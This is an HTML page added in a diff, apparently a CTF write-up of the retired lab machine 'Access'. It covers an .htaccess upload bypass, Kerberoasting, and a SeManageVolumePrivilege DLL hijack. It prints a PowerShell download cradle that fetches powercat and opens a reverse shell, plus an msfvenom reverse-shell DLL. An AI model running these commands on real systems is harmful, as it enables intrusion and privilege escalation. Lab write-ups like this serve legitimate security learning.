@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Access &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Access</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">Kerberoast</span><span class="tag">FileUpload</span><span class="tag">htaccess</span><span class="tag">ExtensionBypass</span><span class="tag">SeManageVolumePrivilege</span><span class="tag">DLLHijack</span><span class="tag">RunasCs</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#php-upload-filter-bypass-via-htaccess">PHP Upload Filter Bypass via .htaccess</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#kerberoasting-svc-mssql">Kerberoasting svc_mssql</a><a class="lvl3" href="#lateral-move-to-svc-mssql-with-runascs">Lateral Move to svc_mssql with RunasCs</a><a class="lvl3" href="#semanagevolumeprivilege-dll-hijack">SeManageVolumePrivilege → DLL Hijack</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Access is a Windows Active Directory box on PG that chains a PHP upload filter bypass, Kerberoasting, and a <code>SeManageVolumePrivilege</code> DLL hijack. A <code>.htaccess</code> upload tricks Apache into executing arbitrary file extensions as PHP, giving a <code>www-data</code> shell. Kerberoasting from that foothold yields <code>svc_mssql</code> credentials. That account's <code>SeManageVolumePrivilege</code> enables a filesystem-wide permission reset that makes <code>tzres.dll</code> hijackable, and running <code>systeminfo</code> triggers the hijacked DLL as <code>NT AUTHORITY\NETWORK SERVICE</code>.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<p>The open port profile confirms a Domain Controller:</p>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+53/tcp   open  domain       Simple DNS Plus
+80/tcp   open  http         Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap         (Domain: access.offsec0.)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap
+5985/tcp open  wsman
+</code></pre>
+<p>Domain: <code>access.offsec</code>. The DC runs Apache on port 80, which is unusual and is the foothold surface.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Gobuster found <code>/uploads</code> and <code>/forms</code>. The "buy tickets" functionality on the site presented a file upload form, the intended path for foothold.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="php-upload-filter-bypass-via-htaccess">PHP Upload Filter Bypass via .htaccess</h3>
+<p>Uploading <code>.php</code> files was blocked by a backend filter. Bypassing it required two uploads:</p>
+<ol>
+<li>A custom <code>.htaccess</code> file instructing Apache to treat a novel extension as PHP:</li>
+</ol>
+<pre><code class="language-sh">echo &quot;AddType application/x-httpd-php .bypass&quot; &gt; .htaccess
+</code></pre>
+<ol>
+<li>A PHP web shell saved as <code>webshell.bypass</code>.</li>
+</ol>
+<blockquote>
+<p><strong>How the .htaccess bypass works:</strong> Apache processes per-directory configuration from <code>.htaccess</code> files. The <code>AddType</code> directive maps a MIME type to a file extension, here, telling Apache to run <code>.bypass</code> files through the PHP interpreter. Upload filters typically blocklist known PHP extensions (<code>.php</code>, <code>.php5</code>, <code>.phtml</code>); a custom extension defined via <code>.htaccess</code> isn't in any standard blocklist. The two-step upload converts the filter into a no-op.</p>
+</blockquote>
+<p>With the shell at <code>/uploads/webshell.bypass?cmd=</code>, I ran a PowerShell download cradle for a Powercat reverse shell:</p>
+<pre><code class="language-powershell">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244:8000/powercat.ps1');powercat -c 192.168.45.208 -p 80 -e cmd&quot;
+</code></pre>
+<p>Shell landed as the web server process.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="kerberoasting-svc-mssql">Kerberoasting svc_mssql</h3>
+<p>WinPEAS found <code>RmSvc</code> modifiable but that didn't pan out. Rubeus enumerated Kerberoastable accounts:</p>
+<pre><code class="language-powershell">.\Rubeus.exe kerberoast
+</code></pre>
+<p>One TGS hash returned for <code>svc_mssql</code>. The hash output needed whitespace stripped before cracking:</p>
+<pre><code class="language-sh">sed ':a;N;$!ba;s/:space://g' hash.txt &gt; clean.txt
+john test.kerb --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64
+‹redacted›   (svc_mssql)
+</code></pre>
+<p>Credentials: <code>svc_mssql:‹redacted›</code></p>
+<blockquote>
+<p><strong>Why Kerberoasting works from any domain account:</strong> Kerberos allows any authenticated domain principal to request a TGS ticket for any service account that has a registered SPN. The ticket is encrypted with the service account's NTLM hash, so the hash is handed to the attacker to crack offline. No lockouts, no noise on the DC. Weak service account passwords, like this one, fall in seconds.</p>
+</blockquote>
+<h3 id="lateral-move-to-svc-mssql-with-runascs">Lateral Move to svc_mssql with RunasCs</h3>
+<p>RunasCs executed a pre-staged MSFVenom payload under the <code>svc_mssql</code> identity:</p>
+<pre><code class="language-powershell">Invoke-RunasCs -Username svc_mssql -Password ‹redacted› -Command &quot;shell.exe&quot;
+</code></pre>
+<p>Shell caught on port 135 as <code>access\svc_mssql</code>.</p>
+<h3 id="semanagevolumeprivilege-dll-hijack">SeManageVolumePrivilege → DLL Hijack</h3>
+<p><code>whoami /priv</code> showed <code>SeManageVolumePrivilege</code> enabled.</p>
+<blockquote>
+<p><strong>What SeManageVolumePrivilege enables:</strong> this privilege grants the ability to perform maintenance operations on volumes, including modifying DACL entries on the filesystem. The <code>SeManageVolumeExploit</code> tool uses it to reset ACLs on <code>C:\Windows\System32</code>, giving write access to DLLs that are normally protected. It's a privilege designed for backup and disk management software; granted to a service account, it becomes a root-equivalent escalation path.</p>
+</blockquote>
+<p>Downloaded and ran the exploit:</p>
+<pre><code class="language-powershell">.\volume.exe
+Entries changed: 922
+DONE
+</code></pre>
+<p>Generated a malicious DLL:</p>
+<pre><code class="language-sh">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=53 -f dll -o tzres.dll
+</code></pre>
+<p>Dropped <code>tzres.dll</code> into <code>C:\Windows\System32\wbem\</code>. Running <code>systeminfo</code> loads <code>tzres.dll</code> as part of timezone resolution, with the hijacked DLL in place, that triggered the reverse shell:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.187] 50437
+C:\Windows\system32&gt;whoami
+nt authority\network service
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt;type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong><code>.htaccess</code> upload bypasses are reliable against Apache when the directory allows overrides.</strong> Two uploads, the config and the payload, is a standard technique for any blocklist-based PHP filter.</li>
+<li><strong>Kerberoasting requires only one valid domain user session.</strong> A web-shell process running as <code>www-data</code> on a domain-joined machine is enough to request TGS tickets.</li>
+<li><strong><code>SeManageVolumePrivilege</code> is a high-value token privilege.</strong> It doesn't appear in "obvious privesc" lists but enables full DACL control over <code>System32</code>, turning DLL hijacking into a reliable escalation.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
